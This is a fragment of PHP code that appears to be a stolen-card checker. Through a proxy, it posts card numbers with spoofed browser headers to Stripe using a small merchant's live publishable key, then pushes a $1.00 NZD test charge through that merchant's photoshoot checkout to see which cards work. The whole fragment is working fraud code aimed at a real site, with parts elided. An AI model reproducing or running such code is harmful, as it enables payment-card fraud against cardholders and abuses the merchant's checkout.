...
$page =  cURL_ProxyOn(
"https://clickhappy.org/asp-products/mini-photoshoot/",
    $headers = [
...
$token_method =  cURL_ProxyOn(
    ...
    "email=$email&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F78ef418)&referrer=https%3A%2F%2Fclickhappy.org%2Fasp-products%2Fmini-photoshoot%2F&time_checkout_opened=1655196722&time_checkout_loaded=1655196721&card[number]=$cc&card[cvc]=&card[exp_month]=".ltrim($mm,0)."&card[exp_year]=$yy&card[name]=$email&card[address_zip]=".rand(91000,94000)."&time_on_page=9633&guid=$guid&muid=$muid&sid=$sid&key=pk_live_euZgo3ScP8NkeILFBxRYrjTO",
    "POST",
    1,
    $cookie
...
if (strpos($token_method, '"id": "tok_') && !strpos($token_method, '"error":')) {
    ...
    $ajax_confirm =  cURL_ProxyOn(
        ...
        $headers = [
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "content-type: application/x-www-form-urlencoded",
            "referer: https://clickhappy.org/asp-products/mini-photoshoot/",
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39'
        ],
        "stripeAmount=1.00&stripeProductId=3790&stripeToken=$token&stripeTokenType=card&stripeEmail=$email&stripeButtonKey=$buttonkey&stripeItemPrice=0&stripeTax=0&stripeShipping=0&stripeItemCost=0&asp_action=process_ipn&item_name=Mini+Photoshoot&item_quantity=1&currency_code=NZD&item_url=&thankyou_page_url=&charge_description=&clickProcessed=1",
        "POST",
        1,
        $cookie
    );
